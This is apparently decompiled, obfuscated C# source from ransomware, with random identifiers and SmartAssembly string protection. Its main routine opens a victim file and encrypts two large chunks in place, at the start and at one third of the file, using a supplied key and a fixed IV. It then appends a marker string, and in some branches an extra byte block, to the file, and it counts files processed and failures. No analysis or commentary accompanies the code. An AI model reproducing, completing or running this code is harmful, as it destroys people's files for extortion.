using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using zsCTTYWyHDaJcbz;

namespace KXfHkplBSblOeZ;

internal sealed class OAyPyXfJFHzyE
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int lADrWImMrvla(long long_0)
	{
		return (int)long_0;
	}

	public static void pjoDpqAxNLvCK(string rgekPTbARVtthd, string RKGqnivtnNJqKn, string BVvQBoPWqXyh, byte[] VJyauYjTUDw = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(rgekPTbARVtthd, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = lADrWImMrvla(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(RKGqnivtnNJqKn) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(RKGqnivtnNJqKn) * 1000 * 1000;
				}
				int dXfhJmgHFJVv = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = PYDfquhnwkhp(rgekPTbARVtthd, fileStream, dXfhJmgHFJVv, num * i);
					array = (NiISdmMYRfnXGiX.uBTtlGfiltatoKc ? cjmgOsWWHNKDnF.ZKVQwrhLTMzsBn(byte_, Encoding.ASCII.GetBytes(BVvQBoPWqXyh), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ufQnCLzUSY.LLqeTUvZTvS(byte_, Encoding.ASCII.GetBytes(BVvQBoPWqXyh), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					xtEMsqwuSyFc(rgekPTbARVtthd, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (NiISdmMYRfnXGiX.dHWQzBpmcn ? Encoding.ASCII.GetBytes(NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107401894)) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403494)) + Convert.ToString(RKGqnivtnNJqKn) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403494))) : Encoding.ASCII.GetBytes(NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107401894)) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403471)) + Convert.ToString(RKGqnivtnNJqKn) + NiISdmMYRfnXGiX.yasjygrGJqTJ(getString_0(107403471))));
			if (!NiISdmMYRfnXGiX.dHWQzBpmcn)
			{
				using FileStream fileStream2 = new FileStream(rgekPTbARVtthd, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(rgekPTbARVtthd, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(VJyauYjTUDw, 0, VJyauYjTUDw.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (NiISdmMYRfnXGiX.SsCiUkhFaPaV)
			{
				try
				{
					File.AppendAllText(NiISdmMYRfnXGiX.eBcYzZJOdxm, getString_0(107389304) + rgekPTbARVtthd + getString_0(107401881) + ex.Message + getString_0(107396828));
				}
				catch (Exception)
				{
				}
			}
			NiISdmMYRfnXGiX.BFoWsrHVmkbzUDmB++;
		}
		NiISdmMYRfnXGiX.RVAcslUCYF++;
	}

	public static byte[] PYDfquhnwkhp(string uSMLqMnFVBLX, FileStream OSPEjbdoFZPpp, int dXfhJmgHFJVv, int qRUceZvVPuBwxg = 0)
	{
		byte[] array = new byte[dXfhJmgHFJVv];
		OSPEjbdoFZPpp.Position = qRUceZvVPuBwxg;
		OSPEjbdoFZPpp.Read(array, 0, dXfhJmgHFJVv);
		return array;
	}

	public static void xtEMsqwuSyFc(string PTSLIKUBsoazNy, FileStream CeqKeqqRuvBG, byte[] YwAtTQqeENM, int JLPWlUtScbO = 0)
	{
		CeqKeqqRuvBG.Position = JLPWlUtScbO;
		CeqKeqqRuvBG.Write(YwAtTQqeENM, 0, YwAtTQqeENM.Length);
	}

	static OAyPyXfJFHzyE()
	{
		Strings.CreateGetStringDelegate(typeof(OAyPyXfJFHzyE));
	}
}
